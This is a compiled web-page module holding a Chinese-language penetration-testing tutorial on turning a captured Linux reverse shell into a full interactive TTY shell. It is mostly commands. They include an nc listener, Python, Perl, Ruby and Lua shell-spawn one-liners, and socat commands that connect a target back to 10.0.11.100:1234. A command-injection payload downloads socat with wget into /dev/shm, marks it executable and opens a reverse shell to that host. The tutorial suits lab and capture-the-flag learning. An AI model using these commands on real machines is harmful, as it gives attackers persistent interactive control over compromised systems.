import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e}from"./app-c332a784.js";const l="/assets/1282531-20220110102654230-1851709271-62c2fd4a.png",i={},t=e(`<h1 id="linux-反向-shell-升级为完全可用的-tty-shell" tabindex="-1"><a class="header-anchor" href="#linux-反向-shell-升级为完全可用的-tty-shell" aria-hidden="true">#</a> Linux 反向 shell 升级为完全可用的 TTY shell</h1><h2 id="升级远程-shell-仅限-unix-机器" tabindex="-1"><a class="header-anchor" href="#升级远程-shell-仅限-unix-机器" aria-hidden="true">#</a> 升级远程 shell（仅限 Unix 机器）</h2><p>通常，在通过 nc 捕获 shell 之后，会在一个功能非常有限的 shell 中。例如没有命令历史记录（并使用向上“”和“向下”箭头循环浏览它们）和文件名称、命令自动完成等。在缺少这些功能的 shell 中查询或操作会比较麻烦。</p><p><strong>注意</strong>：要检查 shell 是否是 TTY shell，请使用 <code>tty</code> 命令。</p><h4 id="rlwrap" tabindex="-1"><a class="header-anchor" href="#rlwrap" aria-hidden="true">#</a> rlwrap</h4><p>可以通过使用 rlwrap 命令包装 nc 侦听器来减轻对 shell 的一些限制。默认情况下不会安装它，需要使用 <code>sudo apt rlwrap</code> 或 <code>apt-get install rlwrap</code> 安装。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>rlwrap <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token variable">$port</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="使用-python-升级到完全交互式-shell" tabindex="-1"><a class="header-anchor" href="#使用-python-升级到完全交互式-shell" aria-hidden="true">#</a> 使用 Python 升级到完全交互式 shell：</h4><ol><li>首先连接到 shell 后，先检查一下 python 的可用性， 用 winch 命令检查：</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">which</span> python python2 python3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>只要安装了其中任何一个，就将返回已安装二进制文件的路径。</p><ol><li>在靶机上输入以下命令（使用机器上可用的 python 版本！）</li></ol><div class="language-rust line-numbers-mode" data-ext="rs"><pre class="language-rust"><code>python3 <span class="token operator">-</span>c <span class="token lifetime-annotation symbol">&#39;import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>&#39;<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol><li>接下来，在靶机上输入以下命令来设置一些重要的环境变量：</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>bash
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color <span class="token comment">#允许 clear，并且有颜色</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>键入 ctrl-z 以将 shell 发送到后台。</li><li>设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>stty raw -echo<span class="token punctuation">;</span><span class="token function">fg</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>回车一次后输入 reset 再回车将再次进入 shell 中：</p><p><img src="`+l+`" alt="image"></p><p>到此 TTY shell 升级完成。</p><h4 id="其他语言写入交互式-shell" tabindex="-1"><a class="header-anchor" href="#其他语言写入交互式-shell" aria-hidden="true">#</a> 其他语言写入交互式 shell：</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> os.system<span class="token punctuation">(</span><span class="token string">&#39;/bin/bash&#39;</span><span class="token punctuation">)</span>
/bin/sh <span class="token parameter variable">-i</span>

<span class="token comment">#python3</span>
python3 <span class="token parameter variable">-c</span> <span class="token string">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>

<span class="token comment">#perl</span>
perl <span class="token parameter variable">-e</span> <span class="token string">&#39;exec &quot;/bin/sh&quot;;&#39;</span>

<span class="token comment">#ruby</span>
<span class="token builtin class-name">exec</span> <span class="token string">&quot;/bin/sh&quot;</span>
ruby <span class="token parameter variable">-e</span> <span class="token string">&#39;exec &quot;/bin/sh&quot;&#39;</span>

<span class="token comment">#lua</span>
lua <span class="token parameter variable">-e</span> <span class="token string">&quot;os.execute(&#39;/bin/sh&#39;)&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="使用-socat" tabindex="-1"><a class="header-anchor" href="#使用-socat" aria-hidden="true">#</a> 使用 socat</h4><p>另一种方法是将 socat 二进制文件上传到靶机并获得一个完全交互式的 shell。从 https://github.com/andrew-d/static-binaries 下载适当的二进制文件。Socat 需要在两台机器上才能工作。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#在本地监听：:</span>
socat file:<span class="token variable"><span class="token variable">\`</span><span class="token function">tty</span><span class="token variable">\`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:4444

<span class="token comment">#靶机:</span>
socat exec:<span class="token string">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果在命令注入的地方注入反弹 shell，获得即时完全交互式的反向 shell：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> <span class="token parameter variable">-q</span> https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat <span class="token parameter variable">-O</span> /dev/shm/socat<span class="token punctuation">;</span> <span class="token function">chmod</span> +x /dev/shm/socat<span class="token punctuation">;</span> /dev/shm/socat exec:<span class="token string">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果靶机访问不了互联网，就先把 socat 文件下载下来，开启 http 服务，然后将上面的路径指向你的本地地址。</p>`,28),c=[t];function p(r,o){return a(),n("div",null,c)}const u=s(i,[["render",p],["__file","Linux方向shell升级为完全可用的TTYshell.html.vue"]]);export{u as default};
